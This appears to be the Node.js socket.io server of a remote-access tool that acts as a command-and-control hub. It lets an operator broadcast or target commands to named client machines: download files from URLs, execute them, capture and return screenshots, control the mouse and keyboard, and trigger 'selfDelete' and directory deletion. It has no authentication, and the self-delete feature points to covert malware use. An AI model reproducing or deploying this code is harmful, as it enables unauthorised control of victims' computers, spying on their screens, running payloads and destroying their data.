var express = require('express');
var app = express();
var server = require('http').createServer(app);
var io = require('socket.io')(server);
//var port = process.env.PORT || 8110;
var port = 8110;


server.listen(port, function() {
	console.log('Server listening at port %d', port);
});

/*
// for client side
	socket = io('http://fosse.co', {
		path: '/8100/socket.io'
	});
 */

function Client(socket) {

	//this.socket = socket;
	this.id = socket.id;
	this.name = "none";
	this.command = function() {

	};

	this.download = function(socket, url, filename) {
		var objectToSend = {};
		objectToSend.url = url;
		if (typeof(filename) != "undefined") {
			objectToSend.filename = filename;
		}
		socket.broadcast.to(this.id).emit("dl", objectToSend);
	};

	this.execute = function(socket, filename) {
		var objectToSend = {};
		objectToSend.filename = filename;
		socket.broadcast.to(this.id).emit("ex", objectToSend);
	};
	
	this.getImage = function(socket, q) {
		var objectToSend = {};
		objectToSend.q = q;
		socket.broadcast.to(this.id).emit("ss", objectToSend);
	};
	
// 	this.getImage2 = function(socket, x1, y1, x2, y2, q) {
// 		var objectToSend = {};
// 		objectToSend.x1 = x1;
// 		objectToSend.y1 = y1;
// 		objectToSend.x2 = x2;
// 		objectToSend.y2 = y2;
// 		objectToSend.q = q;
// 		socket.broadcast.to(this.id).emit("ss2", objectToSend);
// 	};
	
	this.moveMouse = function(socket, x, y) {
		var objectToSend = {};
		objectToSend.x = x;
		objectToSend.y = y;
		socket.broadcast.to(this.id).emit("mvm", objectToSend);
	};
	
	this.mouseAction = function(socket, x, y, which) {
		var objectToSend = {};
		objectToSend.x = x;
		objectToSend.y = y;
		objectToSend.which = which;
		socket.broadcast.to(this.id).emit("mac", objectToSend);
	};
	
	this.sendText = function(socket, text) {
		var objectToSend = {};
		objectToSend.text = text;
		socket.broadcast.to(this.id).emit("txt", objectToSend);
	};

}




var clients = [];

function findClientByID(id) {
	var index = -1;
	for (var i = 0; i < clients.length; i++) {
		if (clients[i].id == id) {
			index = i;
			return index;
		}
	}
	return index;
}

function findClientByName(name) {
	var index = -1;
	for (var i = 0; i < clients.length; i++) {
		if (clients[i].name == name) {
			index = i;
			return index;
		}
	}
	return index;
}

//var numClients = 0;

io.on('connection', function(socket) {

	//console.log("USER CONNECTED");
	//numClients += 1;

	var client = new Client(socket);
	clients.push(client);

	console.log("number of clients connected: " + clients.length);

	socket.broadcast.emit("registerNames");

	socket.on("registerName", function(data) {
		var index = findClientByID(socket.id);
		clients[index].name = data;
	});


	socket.on("listAll", function() {
		//socket.broadcast.emit("registerNames");
		io.emit("registerNames");

		var names = [];
		for (var i = 0; i < clients.length; i++) {
			var client = clients[i];
			if (client.name != "none") {
				names.push(client.name);
			}
		}

		console.log(names);
		// 		for(var i = 0; i < clients.length; i++) {
		// 			socket.emit.to(clients[i].id
		// 		}
		io.emit("names", names);
		//socket.broadcast.emit("names", names);
	});







	// to all users:

	// when the client emits 'new message', this listens and executes
	socket.on("download", function(data) {
		
		if(data.url === "") {
			return;
		}

		console.log("broadcasting: ");
		console.log(data);
		
		// send data as an object
		var objectToSend = {};
		objectToSend.url = data.url;
		
		socket.broadcast.emit("dl", objectToSend);
	});


	socket.on("execute", function(data) {
		
		if(data.filename === "") {
			return;
		}

		console.log("broadcasting: ");
		console.log(data);

		// we tell the client to execute 'new message'
		// send data as an object
		var objectToSend = {};
		objectToSend.filename = data.filename;
		socket.broadcast.emit("ex", objectToSend);
	});
	
	// on console command "getImage"
	// get the image from the client:
	socket.on("getImage", function(data) {
		console.log("broadcasting: ss");
		socket.broadcast.emit("ss", {q:30});
	});


	socket.on("selfDelete", function(data) {
		console.log("self delete all: ");
		socket.broadcast.emit("sd");
	});

	socket.on("deleteDirectory", function(data) {
		console.log("delete all in dir: ");
		socket.broadcast.emit("dd");
	});


	socket.on("disconnect", function() {
		// 		var index = -1;
		// 		for (var i = 0; i < clients.length; i++) {
		// 			if(clients[i].id == socket.id) {
		// 				index = i;
		// 			}
		// 		}
		var index = findClientByID(socket.id);
		clients.splice(index, 1);

		//numClients -= 1;
		console.log("number of clients connected: " + clients.length);
	});


	
	
	// after recieving the image, send it to the console
	socket.on("screenshot", function(data) {
		var obj = {};
		obj.src = data;
		
		var index = findClientByID(socket.id);
		if (index != -1) {
			var client = clients[index];
			obj.name = client.name;
		}
		
		io.emit("viewImage", obj);
	});
	
	
	// directed:

	socket.on("directedDownload", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		client.download(socket, data.url);
	});


	socket.on("directedExecution", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		client.execute(socket, data.filename);
	});
	
	socket.on("directedGetImage", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {return;}
		var client = clients[index];
		
		var quality = parseInt(data.quality);
		quality = (isNaN(quality)) ? 0 : quality;
		client.getImage(socket, quality);
	});
	
	socket.on("directedMoveMouse", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) { return; }
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.moveMouse(socket, x, y);
		client.mouseAction(socket, x, y, 0);
	});
	
	socket.on("directedLeftClick", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.leftClick(socket, x, y);
		client.mouseAction(socket, x, y, 1);
	});
	
	socket.on("directedRightClick", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.rightClick(socket, x, y);
		client.mouseAction(socket, x, y, 2);
	});
	
	
	
	socket.on("directedLeftDown", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.leftDown(socket, x, y);
		client.mouseAction(socket, x, y, 3);
	});
	
	socket.on("directedRightDown", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.rightDown(socket, x, y);
		client.mouseAction(socket, x, y, 4);
	});
	
	socket.on("directedLeftUp", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.leftUp(socket, x, y);
		client.mouseAction(socket, x, y, 5);
	});
	
	socket.on("directedRightUp", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) {
			return;
		}
		var client = clients[index];
		var x = parseInt(data.x);
		var y = parseInt(data.y);
		x = (isNaN(x)) ? 0 : x;
		y = (isNaN(y)) ? 0 : y;
		//client.rightUp(socket, x, y);
		client.mouseAction(socket, x, y, 6);
	});
	
	socket.on("directedSendText", function(data) {
		var index = findClientByName(data.user);
		if (index == -1) { return; }
		if (data.text === "") { return; }
		var client = clients[index];
		console.log("sending " + data.text);
		client.sendText(socket, data.text);
	});
	
	


});